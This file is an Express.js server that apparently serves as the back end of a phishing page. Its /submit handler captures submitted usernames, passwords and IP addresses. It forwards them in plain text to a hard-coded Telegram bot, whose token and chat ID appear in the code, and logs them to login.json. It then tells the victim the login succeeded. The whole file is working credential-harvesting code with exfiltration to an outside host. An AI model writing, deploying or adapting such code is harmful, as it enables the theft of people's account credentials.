const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const axios = require('axios'); // Import Axios

const app = express();
const PORT = 3000;
app.use(express.static(path.join(__dirname, 'public')));
const LOGIN_FILE = path.join(__dirname, 'login.json');

// TELEGRAM BOT CONFIGURATION
const BOT_TOKEN = '7946994988:AAHumo9PFxEXk63O5ZDw5aG7TZOyn22G6_Q';  // Replace with your bot token
const CHAT_ID = '7191391586';               // Replace with your chat ID

// Enable CORS to allow requests from frontend
app.use(cors());
app.use(bodyParser.json());

// Log each request for debugging
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Send message to Telegram
async function sendToTelegram(message) {
  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    const response = await axios.post(telegramUrl, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('Message sent to Telegram:', response.data);
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

// Handle form submission
app.post('/submit', (req, res) => {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const loginDetails = { username, password, ip, timestamp: new Date().toISOString() };

  console.log('Received data:', loginDetails);

  // Format message for Telegram
  const message = `
    <b>New Login Attempt:</b>
    Username: <code>${username}</code>
    Password: <code>${password}</code>
    IP Address: <code>${ip}</code>
    Time: <code>${loginDetails.timestamp}</code>
  `;

  // Send to Telegram
  sendToTelegram(message);

  // Save to login.json
  fs.readFile(LOGIN_FILE, 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading login.json:', err);
      return res.status(500).json({ message: 'Internal Server Error' });
    }

    const logins = JSON.parse(data);
    logins.push(loginDetails);

    fs.writeFile(LOGIN_FILE, JSON.stringify(logins, null, 2), (err) => {
      if (err) {
        console.error('Error writing to login.json:', err);
        return res.status(500).json({ message: 'Internal Server Error' });
      }
      console.log('Login details saved successfully.');
      res.status(200).json({ message: 'Login Successful' });
    });
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
